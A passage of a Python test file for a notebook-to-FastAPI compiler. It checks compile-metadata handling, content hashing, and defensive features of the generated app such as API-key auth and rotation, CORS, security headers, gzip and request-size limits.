):
    """app.py (and its runtime module) are written before Dockerfile/
    .dockerignore generation and write_compile_metadata -- so a failure in
    any of those three later steps (a real disk/permission failure; here
    simulated via generate_dockerfile) previously left app.py already
    reflecting the *new* notebook while .compile_metadata.json, untouched,
    still described whichever notebook the *previous* successful compile
    actually produced it for. That's not merely stale, it's silently
    wrong: every metadata-driven consumer (GET /api/notebooks'
    "currently_compiled"/"compiled_at"/"notebook_changed_since_compile",
    GET /api/generated's "source_notebook_filename"/
    "source_notebook_exists") would confidently report the wrong notebook
    as the one actually being served, with nothing to indicate the
    mismatch. Confirmed reproduced before this fix: recompiling a working
    "add" app with a notebook exposing "multiply" while generate_dockerfile
    was made to raise left the runtime module already containing only
    "multiply", with .compile_metadata.json's "source_notebook" still
    naming the "add" notebook.
    """

    import backend.compiler as compiler_module

    def _make_notebook(path, source):
        notebook = nbformat.v4.new_notebook()
        notebook.cells.append(nbformat.v4.new_code_cell(source))
        with open(path, "w", encoding="utf-8") as f:
            nbformat.write(notebook, f)

    notebook_a = tmp_path / "add.ipynb"
    notebook_b = tmp_path / "multiply.ipynb"
    _make_notebook(notebook_a, "def add(a: int, b: int) -> int:\n    return a + b\n")
    _make_notebook(
        notebook_b, "def multiply(a: int, b: int) -> int:\n    return a * b\n"
    )

    output_dir = tmp_path / "generated"

    # First, a genuinely successful compile.
    compile_notebook(str(notebook_a), str(output_dir))

    metadata_path = output_dir / compiler_module.COMPILE_METADATA_FILENAME
    assert metadata_path.is_file()

    # Now recompile with a different notebook, but make the post-app.py
    # Dockerfile generation step fail -- standing in for a real
    # disk/permission failure at that point.
    monkeypatch.setattr(
        compiler_module,
        "generate_dockerfile",
        lambda *args, **kwargs: (_ for _ in ()).throw(
            PermissionError("simulated disk failure")
        ),
    )

    with pytest.raises(PermissionError):
        compile_notebook(str(notebook_b), str(output_dir))

    # app.py's runtime module already moved on to the new notebook...
    runtime_module_source = (
        output_dir / "runtime" / "notebook_module.py"
    ).read_text(encoding="utf-8")
    assert "def multiply(" in runtime_module_source
    assert "def add(" not in runtime_module_source

    # ...so the now-stale metadata (still describing the *old* notebook)
    # must be gone, not left silently pointing at the wrong one.
    assert not metadata_path.exists()


def test_first_ever_compile_failing_at_a_post_app_py_step_leaves_no_metadata_file(
    tmp_path, monkeypatch
):
    """The no-previous-compile case: there's no stale metadata file to
    remove (none was ever written), so this must be a clean no-op rather
    than crashing trying to remove a file that was never there.
    """

    import backend.compiler as compiler_module

    notebook = tmp_path / "nb.ipynb"
    nb = nbformat.v4.new_notebook()
    nb.cells.append(
        nbformat.v4.new_code_cell("def add(a: int, b: int) -> int:\n    return a + b\n")
    )
    with open(notebook, "w", encoding="utf-8") as f:
        nbformat.write(nb, f)

    output_dir = tmp_path / "generated"

    monkeypatch.setattr(
        compiler_module,
        "generate_dockerfile",
        lambda *args, **kwargs: (_ for _ in ()).throw(
            PermissionError("simulated disk failure")
        ),
    )

    with pytest.raises(PermissionError):
        compile_notebook(str(notebook), str(output_dir))

    assert not (output_dir / compiler_module.COMPILE_METADATA_FILENAME).exists()


def test_hash_notebook_file_is_deterministic_and_content_sensitive(tmp_path):

    from backend.compiler import hash_notebook_file

    notebook_a = tmp_path / "a.ipynb"
    notebook_a.write_text('{"cells": []}', encoding="utf-8")

    notebook_a_copy = tmp_path / "a_copy.ipynb"
    notebook_a_copy.write_text('{"cells": []}', encoding="utf-8")

    notebook_b = tmp_path / "b.ipynb"
    notebook_b.write_text('{"cells": [1]}', encoding="utf-8")

    # Same content (even in a different file) -> same hash.
    assert hash_notebook_file(notebook_a) == hash_notebook_file(notebook_a_copy)
    # Different content -> different hash.
    assert hash_notebook_file(notebook_a) != hash_notebook_file(notebook_b)
    # A plain hex sha256 digest, not some other encoding.
    digest = hash_notebook_file(notebook_a)
    assert len(digest) == 64
    int(digest, 16)  # must not raise


def test_compile_metadata_records_the_source_notebooks_content_hash(tmp_path):
    """Closes the gap left by write_compile_metadata recording only
    *which* notebook was compiled: even knowing that, there was no way to
    tell whether the notebook had since been edited and re-uploaded,
    leaving the currently-served app silently stale relative to it (see
    test_list_notebooks_flags_a_notebook_changed_since_its_last_compile
    in test_upload_routes.py for the end-to-end behavior this enables).
    """

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME, hash_notebook_file

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    metadata_path = output_dir / COMPILE_METADATA_FILENAME
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert metadata["source_notebook_sha256"] == hash_notebook_file(notebook_path)


def test_compile_metadata_records_generated_files_sha256(tmp_path):
    """The output-side counterpart to source_notebook_sha256 above: a
    baseline hash over the compile-produced files themselves (app.py,
    requirements.txt, Dockerfile, ...), recorded at the very end of a
    successful compile so a later caller can tell whether the *compiled
    output* has since been hand-edited on the server, not just whether
    the source notebook has.
    """

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME, _generated_files_sha256

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    metadata_path = output_dir / COMPILE_METADATA_FILENAME
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert metadata["generated_files_sha256"] == _generated_files_sha256(str(output_dir))


def test_generated_files_sha256_changes_when_a_generated_file_is_hand_edited(tmp_path):

    from backend.compiler import _generated_files_sha256

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    baseline = _generated_files_sha256(str(output_dir))

    (output_dir / "requirements.txt").write_text(
        "fastapi==0.0.0\n", encoding="utf-8"
    )

    assert _generated_files_sha256(str(output_dir)) != baseline


def test_generated_files_sha256_changes_when_env_example_is_hand_edited(tmp_path):

    from backend.compiler import _generated_files_sha256

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    baseline = _generated_files_sha256(str(output_dir))

    (output_dir / ".env.example").write_text(
        "PORT=9999\n", encoding="utf-8"
    )

    assert _generated_files_sha256(str(output_dir)) != baseline


def test_generated_files_sha256_changes_when_kubernetes_manifest_is_hand_edited(
    tmp_path
):
    """kubernetes.yaml (generate_kubernetes_manifest) is now a real
    compile-produced artifact, like docker-compose.yml/.env.example/
    README.md -- it must participate in the same hand-edit detection
    _generated_files_sha256 already gives those, or GET /api/notebooks'
    own "generated_files_modified_since_compile" would silently miss a
    hand-edit to it.
    """

    from backend.compiler import _generated_files_sha256

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    baseline = _generated_files_sha256(str(output_dir))

    (output_dir / "kubernetes.yaml").write_text(
        "kind: Deployment\n", encoding="utf-8"
    )

    assert _generated_files_sha256(str(output_dir)) != baseline


def test_generated_files_sha256_changes_when_readme_is_hand_edited(tmp_path):
    """README.md is a real compile-produced artifact (generate_readme,
    backend/generator/docker_generator.py) just like Dockerfile/
    docker-compose.yml/.env.example -- a hand-edit to it must be detected
    the identical way theirs already are.
    """

    from backend.compiler import _generated_files_sha256

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    baseline = _generated_files_sha256(str(output_dir))

    (output_dir / "README.md").write_text(
        "hand-edited\n", encoding="utf-8"
    )

    assert _generated_files_sha256(str(output_dir)) != baseline


def test_generated_files_sha256_ignores_files_outside_the_known_set(tmp_path):
    """A generic directory walk would pick up an unrelated file an
    operator (or a later POST /api/export-openapi/export-sdk) dropped
    into output_dir -- this hash must only ever reflect the specific
    files a compile itself actually produces.
    """

    from backend.compiler import _generated_files_sha256

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    baseline = _generated_files_sha256(str(output_dir))

    (output_dir / "openapi.json").write_text("{}", encoding="utf-8")

    assert _generated_files_sha256(str(output_dir)) == baseline


def test_generated_files_sha256_skips_a_missing_file_without_raising(tmp_path):

    from backend.compiler import _generated_files_sha256

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    baseline = _generated_files_sha256(str(output_dir))

    (output_dir / ".dockerignore").unlink()

    changed = _generated_files_sha256(str(output_dir))

    assert changed != baseline  # a missing file still changes the hash
    # ...but doesn't raise, confirmed simply by reaching this assertion.


def test_compiler_pipeline_optional_none_default_param_is_actually_optional(
    tmp_path
):
    """`def greet(name, title=None)` is an extremely common Python idiom
    for an optional parameter. Confirmed live before this fix: the
    generated endpoint 422'd on a request that omitted `title`, because
    the generated Pydantic field was marked required -- default=None was
    indistinguishable from "no default" once extracted.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def greet(name: str, title: str = None) -> str:\n"
                            "    return ((title or '') + ' ' + name).strip()\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
resp = client.post(
    "/greet",
    json={{"name": "Ada"}},
    headers={{"X-API-Key": "notebook-to-api-dev-key"}},
)
assert resp.status_code == 200, resp.text
assert resp.json() == {{"result": "Ada"}}, resp.json()
print("OPTIONAL_NONE_DEFAULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "OPTIONAL_NONE_DEFAULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_api_key_auth_still_works_end_to_end(tmp_path):
    """Behavioral check that switching the API key comparison to
    hmac.compare_digest didn't change any of the three real outcomes:
    missing header and wrong key both 401, correct key succeeds.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
payload = {{"a": 1, "b": 2}}

no_header = client.post("/add", json=payload)
assert no_header.status_code == 401, no_header.text

wrong_key = client.post("/add", json=payload, headers={{"X-API-Key": "wrong"}})
assert wrong_key.status_code == 401, wrong_key.text

correct_key = client.post(
    "/add", json=payload, headers={{"X-API-Key": "notebook-to-api-dev-key"}}
)
assert correct_key.status_code == 200, correct_key.text
assert correct_key.json() == {{"result": 3}}, correct_key.json()

print("API_KEY_AUTH_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "API_KEY_AUTH_E2E_OK" in proc.stdout


def test_compiler_pipeline_generated_app_allows_cross_origin_requests_by_default(
    tmp_path,
):
    """Before this, the generated app had no CORS configuration at all --
    a browser-based frontend calling a deployed generated API (the whole
    point of generating one) was blocked by CORS with no way to fix it
    short of hand-editing the generated file.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)

preflight = client.options(
    "/add",
    headers={{
        "Origin": "https://example.com",
        "Access-Control-Request-Method": "POST",
    }},
)
assert preflight.status_code == 200, preflight.text
# CORSMiddleware emits a literal "*" (not a reflected Origin) when "*" is
# in allow_origins and allow_credentials is False.
assert preflight.headers["access-control-allow-origin"] == "*"

resp = client.post(
    "/add",
    json={{"a": 1, "b": 2}},
    headers={{
        "X-API-Key": "notebook-to-api-dev-key",
        "Origin": "https://example.com",
    }},
)
assert resp.status_code == 200, resp.text
assert resp.headers["access-control-allow-origin"] == "*"
assert "access-control-allow-credentials" not in resp.headers

print("CORS_DEFAULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "CORS_DEFAULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_generated_app_respects_configured_allowed_origins(
    tmp_path,
):
    """NOTEBOOK_API_ALLOWED_ORIGINS lets a real deployment lock the
    permissive "*" default down to a known frontend origin, matching the
    dashboard API's own NOTEBOOK_API_ALLOWED_ORIGINS convention (see
    allowed_origins() in backend/dashboard.py).
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

os.environ["NOTEBOOK_API_ALLOWED_ORIGINS"] = "https://allowed.example.com"

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)

allowed = client.post(
    "/add",
    json={{"a": 1, "b": 2}},
    headers={{
        "X-API-Key": "notebook-to-api-dev-key",
        "Origin": "https://allowed.example.com",
    }},
)
assert allowed.status_code == 200, allowed.text
assert allowed.headers["access-control-allow-origin"] == "https://allowed.example.com"

disallowed = client.post(
    "/add",
    json={{"a": 1, "b": 2}},
    headers={{
        "X-API-Key": "notebook-to-api-dev-key",
        "Origin": "https://not-allowed.example.com",
    }},
)
assert "access-control-allow-origin" not in disallowed.headers

print("CORS_CONFIGURED_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "CORS_CONFIGURED_E2E_OK" in proc.stdout


def test_compiler_pipeline_generated_app_stamps_security_headers_on_every_response(
    tmp_path,
):
    """Confirmed exploitable before this fix: a real compiled app set
    none of X-Content-Type-Options/X-Frame-Options/Referrer-Policy on any
    response -- not the ones a client actually wants (2xx), and not the
    ones where a browser's own default MIME-sniffing/framing behavior
    matters just as much: a 401 (invalid key), a 413 (oversized body,
    from MaxRequestBodySizeMiddleware -- registered *before* this new
    middleware, so it must still see a response this middleware wraps),
    and even /docs itself.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

os.environ["NOTEBOOK_API_MAX_REQUEST_BYTES"] = "50"

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}


def assert_hardened(resp):
    assert resp.headers["X-Content-Type-Options"] == "nosniff", resp.headers
    assert resp.headers["X-Frame-Options"] == "DENY", resp.headers
    assert resp.headers["Referrer-Policy"] == "no-referrer", resp.headers


success = client.post("/add", json={{"a": 1, "b": 2}}, headers=headers)
assert success.status_code == 200, success.text
assert_hardened(success)

unauthorized = client.post("/add", json={{"a": 1, "b": 2}}, headers={{"X-API-Key": "wrong"}})
assert unauthorized.status_code == 401, unauthorized.text
assert_hardened(unauthorized)

oversized = client.post(
    "/add", json={{"a": 1, "b": 2, "padding": "x" * 200}}, headers=headers,
)
assert oversized.status_code == 413, oversized.text
assert_hardened(oversized)

docs = client.get("/docs")
assert docs.status_code == 200, docs.text
assert_hardened(docs)

print("SECURITY_HEADERS_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "SECURITY_HEADERS_E2E_OK" in proc.stdout


def test_compiler_pipeline_generated_app_stamps_x_process_time_ms(tmp_path):
    """Confirmed exploitable before this fix: a real compiled app gave an
    operator no way to see per-request latency at all -- no header, no
    endpoint -- short of instrumenting it externally.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
resp = client.get("/health")
assert resp.status_code == 200, resp.text
elapsed_ms = float(resp.headers["X-Process-Time-Ms"])
assert elapsed_ms >= 0, resp.headers

auto_id_resp = client.get("/health")
assert auto_id_resp.headers["X-Request-ID"], auto_id_resp.headers

echoed_resp = client.get("/health", headers={{"X-Request-ID": "caller-supplied-xyz"}})
assert echoed_resp.headers["X-Request-ID"] == "caller-supplied-xyz", echoed_resp.headers

print("PROCESS_TIME_HEADER_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "PROCESS_TIME_HEADER_E2E_OK" in proc.stdout


def test_compiler_pipeline_generated_app_gzip_compresses_a_large_response(tmp_path):
    """Confirmed exploitable before this fix: a real compiled app never
    compressed any response, no matter how large -- a caller sending
    Accept-Encoding: gzip against an endpoint returning a large payload
    still always got the full uncompressed body back, a real bandwidth
    cost this app had no way to avoid on its own. Only kicks in when the
    caller's own Accept-Encoding actually asks for it (Accept-Encoding:
    identity must still get an uncompressed response), and the
    decompressed content must still be exactly right either way.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def get_large_payload() -> str:\n"
                            "    return 'x' * 2000\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

compressed = client.post(
    "/get_large_payload", json={{}}, headers={{**headers, "Accept-Encoding": "gzip"}},
)
assert compressed.status_code == 200, compressed.text
assert compressed.headers.get("content-encoding") == "gzip", compressed.headers
assert compressed.json() == {{"result": "x" * 2000}}, compressed.json()

uncompressed = client.post(
    "/get_large_payload", json={{}}, headers={{**headers, "Accept-Encoding": "identity"}},
)
assert uncompressed.status_code == 200, uncompressed.text
assert "content-encoding" not in uncompressed.headers, uncompressed.headers
assert uncompressed.json() == {{"result": "x" * 2000}}, uncompressed.json()

print("GZIP_COMPRESSION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "GZIP_COMPRESSION_E2E_OK" in proc.stdout


def test_compiler_pipeline_generated_app_rejects_an_oversized_request_body(tmp_path):
    """Before this, every endpoint on the generated app accepted a JSON
    request body of any size -- unlike this tool's own dashboard
    /api/upload, which has always capped uploads at MAX_UPLOAD_BYTES (see
    routes/upload.py) for exactly this reason. Configurable via
    NOTEBOOK_API_MAX_REQUEST_BYTES, matching the NOTEBOOK_API_* env-var
    convention this generated app's other limits already follow.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

os.environ["NOTEBOOK_API_MAX_REQUEST_BYTES"] = "50"

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

small = client.post("/add", json={{"a": 1, "b": 2}}, headers=headers)
assert small.status_code == 200, small.text
assert small.json() == {{"result": 3}}, small.json()

oversized = client.post(
    "/add",
    json={{"a": 1, "b": 2, "padding": "x" * 200}},
    headers=headers,
)
assert oversized.status_code == 413, oversized.text
assert "50 bytes" in oversized.text, oversized.text

print("MAX_REQUEST_BODY_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "MAX_REQUEST_BODY_E2E_OK" in proc.stdout


def test_compiler_pipeline_generated_app_default_request_body_limit_allows_normal_requests(
    tmp_path,
):
    """The default (10MB, matching MAX_UPLOAD_BYTES's own default) must
    not reject an ordinary, unconfigured request -- this middleware is
    meant to catch genuinely oversized bodies, not interfere with normal
    usage when NOTEBOOK_API_MAX_REQUEST_BYTES is left unset.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
resp = client.post(
    "/add",
    json={{"a": 1, "b": 2}},
    headers={{"X-API-Key": "notebook-to-api-dev-key"}},
)
assert resp.status_code == 200, resp.text
assert resp.json() == {{"result": 3}}, resp.json()

print("MAX_REQUEST_BODY_DEFAULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "MAX_REQUEST_BODY_DEFAULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_supports_zero_downtime_api_key_rotation(tmp_path):
    """Confirmed exploitable before this fix: /auth/info advertised
    'key_rotation': True, but the generated app only ever read a single
    key from NOTEBOOK_API_KEY -- there was no way to accept an old and a
    new key at once, so "rotating" the key meant a hard cutover where
    every client using the old key started getting 401s the moment the
    env var changed. NOTEBOOK_API_KEY is now a comma-separated list, so
    both an old and a new key can be valid at once during a rotation
    window.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import os
import sys

os.environ["NOTEBOOK_API_KEY"] = "old-key, new-key"

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
payload = {{"a": 1, "b": 2}}

old_key = client.post("/add", json=payload, headers={{"X-API-Key": "old-key"}})
assert old_key.status_code == 200, old_key.text

new_key = client.post("/add", json=payload, headers={{"X-API-Key": "new-key"}})
assert new_key.status_code == 200, new_key.text

unrelated_key = client.post("/add", json=payload, headers={{"X-API-Key": "someone-elses-key"}})
assert unrelated_key.status_code == 401, unrelated_key.text

info = client.get("/auth/info")
assert info.json()["configured_keys"] == 2, info.json()

print("API_KEY_ROTATION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "API_KEY_ROTATION_E2E_OK" in proc.stdout


def test_compiler_pipeline_rate_limiting_disabled_by_default(tmp_path):
    """NOTEBOOK_API_RATE_LIMIT_PER_MINUTE defaults to "0", which must
    mean unlimited (the previous, pre-rate-limiting behavior) rather than
    "zero requests allowed" -- a request volume well past any real
    per-minute limit still succeeds every time, and /auth/info reports
    the feature as off.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
